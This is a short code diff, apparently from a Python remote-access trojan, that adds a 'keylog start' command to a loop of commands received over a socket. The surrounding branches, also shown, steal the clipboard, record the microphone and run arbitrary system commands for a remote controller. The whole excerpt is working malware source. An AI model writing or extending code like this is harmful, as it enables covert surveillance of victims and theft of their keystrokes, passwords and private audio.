@@ -52,6 +52,9 @@ def run(host, port):
                 send_clipboard(client_socket)
             elif command[:21] == "mic_record --duration":
                 mic_record(client_socket, command)
+            elif command == "keylog start":
+                klogger.start()
+                socket_send(client_socket, "[+] Keylogger Started.")
             else:  # * Run Other System Commands
                 execute_system_command(client_socket, command)
     except:
